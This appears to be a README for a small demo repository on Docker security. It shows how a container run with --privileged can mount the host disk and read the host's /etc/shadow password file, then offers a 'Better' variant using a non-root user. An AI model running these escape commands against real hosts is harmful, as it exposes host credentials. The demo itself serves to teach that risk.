# privileged

An exmaple of doing a bad thing to an unsecured container.

## Bad thing

``shell
cd ~/git/privileged
docker build -t privileged:latest .
docker run --rm -it --privileged privileged:latest bash
mount /dev/sdc /mnt/gotcha
cd /mnt/gotcha
ls -l

cat /mnt/gotcha/etc/shadow
```

## Better

Uncomment the new user creation in `Dockerfile`, then

```shell
docker build -t privileged:latest .
docker run --rm -it --privileged privileged:latest bash
mount /dev/sdc /mnt/gotcha
whoami
```
